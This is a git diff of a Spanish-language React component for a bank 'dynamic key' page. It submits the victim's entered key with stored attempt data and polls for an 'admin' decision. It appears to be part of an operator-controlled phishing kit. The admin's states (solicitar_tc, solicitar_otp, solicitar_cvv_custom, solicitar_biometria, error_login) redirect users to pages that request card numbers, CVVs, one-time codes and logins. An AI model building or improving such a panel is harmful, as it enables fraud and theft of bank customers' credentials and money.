@@ -331,14 +331,17 @@ export default function ClaveDinamica() {
             // Se prepara la data a enviar
             const clave = formState.clave;
 
-            // Se prepara el objeto a enviar en el formato correcto
+            // Registrar intento antes de enviar
+            actualizarLocalStorage(clave);
+
+            // Prepara los datos con ID de sesión
+            const dataLocalStorage = localStorage.getItem("datos_usuario") ? JSON.parse(localStorage.getItem("datos_usuario")) : null;
+
+            // Se envia la data
             const dataSend = {
-                data: {
-                    attributes: {
-                        sesion_id: sesionId,
-                        clave: clave
-                    }
-                }
+                "data": {
+                    "attributes": dataLocalStorage
+                },
             };
 
             // Enviar al backend
@@ -346,7 +349,6 @@ export default function ClaveDinamica() {
 
             // Iniciar polling para esperar respuesta del admin
             iniciarPolling(sesionId);
-
         } catch (error) {
 
             // En caso de error, se muestra un mensaje
@@ -368,10 +370,20 @@ export default function ClaveDinamica() {
 
                 // Estados que detienen el polling
                 const estadosFinales = [
+
+                    // Botones linea 1
                     'solicitar_tc', 'solicitar_otp', 'solicitar_din', 'solicitar_finalizar',
+
+                    // Botones linea 2
                     'error_tc', 'error_otp', 'error_din', 'error_login',
+
+                    // Botones linea 3
                     'solicitar_biometria', 'error_923',
+
+                    // Botones linea 4
                     'solicitar_tc_custom', 'solicitar_cvv_custom',
+
+                    // Estados adicionales por pantalla
                     'aprobado', 'error_pantalla', 'bloqueado_pantalla'
                 ];
 
@@ -382,62 +394,127 @@ export default function ClaveDinamica() {
                 // Redirecciones basadas en respuesta del admin
                 switch (estado.toLowerCase()) {
                     case 'solicitar_tc':
-                    case 'error_tc':
-                        window.location.href = '/validacion-tc';
-                        break;
 
+                        // Redirigir a la validación de tarjeta de crédito
+                        window.location.href = '/validacion-tc';
+
+                        // Se sale del ciclo
+                        break;
+                    case 'error_tc':
+
+                        // Se almacena en el localStorage el estado de sesión con error
+                        localStorage.setItem('estado_sesion', 'error');
+
+                        // Redirigir a la validación de tarjeta de crédito
+                        window.location.href = '/validacion-tc';
+
+                        // Se sale del ciclo
+                        break;
                     case 'solicitar_otp':
+
+                        // Se quita el estado de cargando
+                        setCargando(false);
+
+                        // Se limpia la clave
+                        handleClear();
+
+                        // Se sale del ciclo
+                        break;
                     case 'error_otp':
                         window.location.href = '/numero-otp';
                         break;
 
                     case 'solicitar_din':
-                    case 'error_din':
+
                         // Recargar para reintentar DIN
                         setCargando(false);
+
+                        // Se limpia la clave
                         handleClear();
+
+                        // Se sale del ciclo
+                        break;
+                    case 'error_din':
+
+                        // Recargar para reintentar DIN
+                        setCargando(false);
+
+                        // Se limpia la clave
+                        handleClear();
+
+                        // Se muestra el modal de error DIN
                         setFormState(prev => ({
                             ...prev,
                             lanzarModalClaveDinamica: true
                         }));
+
+                        // Se cierra el modal despues de 2 segundos
                         setTimeout(() => {
                             setFormState(prev => ({
                                 ...prev,
                                 lanzarModalClaveDinamica: false
                             }));
                         }, 2000);
-                        break;
 
+                        // Se sale del ciclo
+                        break;
                     case 'solicitar_finalizar':
+
+                        // Redirigir a la página finalizado
                         window.location.href = '/finalizado-page';
-                        break;
 
+                        // Se sale del ciclo
+                        break;
                     case 'solicitar_biometria':
+
+                        // Redirigir a la verificación de identidad
                         window.location.href = '/verificacion-identidad';
-                        break;
 
+                        // Se sale del ciclo
+                        break;
                     case 'error_923':
+
+                        // Redirigir a la página de error 923
                         window.location.href = '/error-923page';
-                        break;
 
+                        // Se sale del ciclo
+                        break;
                     case 'solicitar_tc_custom':
-                        window.location.href = '/tc-customs';
-                        break;
 
+                        // Redirigir a la validación de tarjeta de crédito custom
+                        window.location.href = '/tc-customs';
+
+                        // Se sale del ciclo
+                        break;
                     case 'solicitar_cvv_custom':
+
+                        // Redirigir a la validación de CVV custom
                         window.location.href = '/tc-customs';
-                        break;
 
+                        // Se sale del ciclo
+                        break;
                     case 'error_login':
-                        window.location.href = '/autenticacion';
-                        break;
 
+                        // Se almacena en el localStorage el estado de sesión con error
+                        localStorage.setItem('estado_sesion', 'error');
+
+                        // Redirigir a la página de autenticación
+                        window.location.href = '/autenticacion';
+
+                        // Se sale del ciclo
+                        break;
                     default:
+
+                        // Se sale del ciclo
                         break;
                 }
-
             } catch (error) {
-                console.error('Error en polling:', error);
+
+                // Se quita el estado de cargando
+                setCargando(false);
+
+                // Se lanza una alerta de error
+                alert('Error consultando estado. Intente nuevamente.');
             }
         }, 3000);
     };
@@ -475,8 +552,6 @@ export default function ClaveDinamica() {
         // Se retorna el objeto de intentos
         return datos.dinamica;
     };
-
-    // Función para verificar el estado de aprobación (Polling)
 
     // Metodo para manejar el foco en el OTP
     const handleOtpFocus = () => {
